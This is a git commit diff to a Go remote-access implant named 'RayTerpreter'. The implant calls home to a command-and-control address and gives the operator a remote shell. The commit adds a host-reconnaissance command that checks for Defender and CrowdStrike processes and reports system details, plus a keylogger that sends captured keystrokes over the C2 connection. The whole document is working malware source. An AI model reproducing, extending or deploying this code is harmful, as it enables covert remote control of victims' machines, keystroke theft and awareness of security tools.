cb44eed38983a63d5d5675d314f921ded958149a
fistfulOfHummus <98347396+fistfulofhummus@users.noreply.github.com>
2024-03-04 15:03:00 +0200

    Added a keylogger

--- go.mod
+++ go.mod
@@ -1,3 +1,12 @@
 module client
 
 go 1.21.6
+
+require github.com/D3Ext/maldev v0.1.4
+
+require (
+	github.com/MarinX/keylogger v0.0.0-20210528193429-a54d7834cc1a
+	github.com/eiannone/keyboard v0.0.0-20220611211555-0d226195f203
+	github.com/mitchellh/go-ps v1.0.0 // indirect
+	golang.org/x/sys v0.8.0 // indirect
+)
--- main.go
+++ main.go
@@ -5,7 +5,12 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"runtime"
 	"time"
+
+	"github.com/D3Ext/maldev/process"
+	//"github.com/MarinX/keylogger"
+	"github.com/eiannone/keyboard"
 )
 
 func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
@@ -20,12 +25,13 @@ func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
 		return addr, false
 	}
 	addr.Write([]byte("Success\n"))
+	*attempts = 0
 	return addr, true
 }
 
-func listen4Commands(conn net.Conn, implantWD *string) string {
+func listen4Commands(conn *net.Conn, implantWD *string) string {
 	request := make([]byte, 128)
-	read_len, err := conn.Read(request)
+	read_len, err := (*conn).Read(request)
 	if read_len == 0 {
 		os.Exit(0)
 	}
@@ -36,7 +42,7 @@ func listen4Commands(conn net.Conn, implantWD *string) string {
 	return command
 }
 
-func executeCommands(conn net.Conn, command string) {
+func executeCommands(conn *net.Conn, command string) {
 	if command == "stop\n" {
 		terminate()
 	}
@@ -48,8 +54,45 @@ func executeCommands(conn net.Conn, command string) {
 	if len(output) < 1 {
 		output = []byte("Couldn't execute the command\n")
 	}
-	conn.Write(output)
-	//conn.Write([]byte("PS > "))
+	(*conn).Write(output)
+}
+
+func checkSec() []string {
+	products := []string{}
+	procs, err := process.GetProcesses()
+	if err != nil {
+		fmt.Println("Couldn't Get Processes")
+	}
+	for index := range procs {
+		if procs[index].Exe == "MsMpEng.exe" {
+			products = append(products, "Defender")
+		}
+		if procs[index].Exe == "CSFalconService.exe" {
+			products = append(products, "CrowdStrike")
+		}
+	}
+	return products
+}
+
+func logger(conn *net.Conn) { //This only works within the context of the current window
+	buffer := make([]byte, 12)
+	if err := keyboard.Open(); err != nil {
+		panic(err)
+	}
+	defer func() {
+		_ = keyboard.Close()
+	}()
+	fmt.Println(len(buffer))
+	for i := 0; i < len(buffer); i++ {
+		char, _, err := keyboard.GetKey()
+		if err != nil {
+			panic(err)
+		}
+		buffer[i] = byte(char)
+		//fmt.Printf("You pressed: rune %q", char)
+	}
+	(*conn).Write([]byte(buffer))
+	(*conn).Write([]byte("\n"))
 }
 
 func terminate() {
@@ -58,8 +101,21 @@ func terminate() {
 	os.Exit(0)
 }
 
+func listen4Commands2(conn *net.Conn, c1 chan string) {
+	request := make([]byte, 32)
+	read_len, err := (*conn).Read(request)
+	if read_len == 0 {
+		os.Exit(0)
+	}
+	if err != nil {
+		os.Exit(0)
+	}
+	command := string(request[:read_len])
+	c1 <- command
+}
+
 func main() {
-	c2Address := "192.168.0.106:443"
+	c2Address := "192.168.5.138:443"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -69,23 +125,57 @@ func main() {
 	}
 	for {
 		conn.Write([]byte("RayTerpreter $ "))
-		command := listen4Commands(conn, &implantWD)
+		command := listen4Commands(&conn, &implantWD)
 		switch command {
 		case "shell\n":
 			{
 				for {
 					conn.Write([]byte("PS > "))
-					command = listen4Commands(conn, &implantWD)
+					command = listen4Commands(&conn, &implantWD)
 					if command == "bg\n" {
 						break
 					}
-					executeCommands(conn, command)
+					executeCommands(&conn, command)
+				}
+			}
+		case "hostinfo\n":
+			{
+				hostname, _ := os.Hostname()
+				home, _ := os.UserHomeDir()
+				OperatingSystem := runtime.GOOS
+				products := checkSec()
+				conn.Write([]byte("\n" + "Hostname: " + hostname + "\n" + "User Dir: " + home + "\n" + "OS: " + OperatingSystem + "\n"))
+				productStr := ""
+				for i := range products {
+					productStr = productStr + products[i] + " "
+				}
+				if len(products) < 1 {
+					products[0] = "No Security Products Present\n"
+				}
+				conn.Write([]byte("Security: " + productStr + "\n\n"))
+			}
+		case "logger\n":
+			{
+				conn.Write([]byte("Send any key besides 'ENTER' to exit the keylogger\n"))
+				c1 := make(chan string)
+				result := "\n"
+				pResult := &result
+				for {
+					go listen4Commands2(&conn, c1)
+					go func() {
+						resultC1 := <-c1
+						*pResult = resultC1
+					}()
+					if result != "\n" { //The function doesnt end instantly, it waits the end of the buffer before exiting.
+						break
+					}
+					logger(&conn)
 				}
 			}
 		case "stop\n":
 			terminate()
 		default:
-			conn.Write([]byte("Available Commands: shell, stop\n"))
+			conn.Write([]byte("Available Commands: shell, hostinfo, logger, stop\n"))
 		}
 	}
 	//time.Sleep(10 * time.Second)
